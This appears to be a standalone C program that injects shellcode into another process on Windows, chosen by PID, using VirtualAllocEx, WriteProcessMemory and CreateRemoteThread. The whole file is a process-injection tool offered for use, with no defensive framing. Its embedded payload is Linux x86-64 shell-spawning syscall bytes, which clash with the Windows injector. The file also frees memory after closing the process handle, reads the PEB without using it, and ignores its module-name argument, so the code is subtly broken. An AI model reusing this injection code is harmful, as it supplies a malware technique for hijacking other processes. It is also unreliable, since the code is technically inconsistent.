#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")

const char* shellcode = 
"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05";

// Define NTSTATUS values
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// Define NtQueryInformationProcess function prototype
typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

// Define ProcessBasicInformation structure
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG UniqueProcessId;
    ULONG Reserved3;
} PROCESS_BASIC_INFORMATION;

// Define PEB structure
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PVOID ProcessParameters;
    BYTE Reserved4[104];
    PVOID Reserved5[52];
    PVOID Reserved6[1];
} PEB;

BOOL InjectShellCode(DWORD pid, const char* moduleName, const char* functionSymbol)
{
    // Open the target process with necessary rights
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_REMOTE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
    if (hProcess == NULL) {
        fprintf(stderr, "Failed to open process with PID %d (error: %d)\n", pid, GetLastError());
        return FALSE;
    }

    // Allocate memory for the shellcode in the target process
    SIZE_T shellcodeSize = strlen(shellcode) + 1; // Include null terminator
    LPVOID pRemoteShellcode = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteShellcode == NULL) {
        fprintf(stderr, "Failed to allocate memory for the shellcode in the target process (error: %d)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write the shellcode into the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, shellcodeSize, NULL)) {
        fprintf(stderr, "Failed to write the shellcode into the target process (error: %d)\n", GetLastError());
        CloseHandle(hProcess);
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        return FALSE;
    }

    // Get the address of NtQueryInformationProcess
    NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (NtQueryInformationProcess == NULL) {
        fprintf(stderr, "Failed to get address of NtQueryInformationProcess (error: %d)\n", GetLastError());
        CloseHandle(hProcess);
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        return FALSE;
    }

    // Query the PEB address of the target process
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
    if (status != STATUS_SUCCESS) {
        fprintf(stderr, "Failed to query PEB address of the target process (status: 0x%08X)\n", status);
        CloseHandle(hProcess);
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        return FALSE;
    }

    // Read the PEB structure from the target process
    PEB peb;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        fprintf(stderr, "Failed to read the PEB of the target process (error: %d)\n", GetLastError());
        CloseHandle(hProcess);
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        return FALSE;
    }

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
    if (hThread == NULL) {
        fprintf(stderr, "Failed to create remote thread in the target process (error: %d)\n", GetLastError());
        CloseHandle(hProcess);
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        return FALSE;
    }

    // Wait for the remote thread to complete
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Clean up
    CloseHandle(hProcess);
    VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);

    printf("Shellcode injection successful.\n");
    return TRUE;
}

int main(int argc, char* argv[])
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <PID> <ModuleName>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);
    const char* moduleName = argv[2];
    const char* functionSymbol = NULL; // Optional: If you want to inject based on a specific function

    if (!InjectShellCode(pid, moduleName, functionSymbol)) {
        return 1;
    }

    return 0;
}
